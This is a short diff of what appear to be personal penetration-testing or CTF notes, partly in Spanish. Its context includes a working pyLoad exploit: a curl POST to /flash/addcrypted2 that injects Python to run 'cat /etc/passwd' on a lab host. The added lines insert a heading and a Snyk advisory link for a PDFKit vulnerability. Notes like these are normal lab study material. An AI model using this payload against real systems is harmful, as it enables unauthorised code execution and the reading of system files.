@@ -125,3 +125,8 @@ Siempre mirar si hay mail en el sistema:
 ### PYLOADER EXPLOIT ###
 
 curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"cat /etc/passwd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://192.168.196.26:9666/flash/addcrypted2' --proxy 127.0.0.1:8080
+
+
+### PDFKIT VULNERABILTY ###
+
+https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
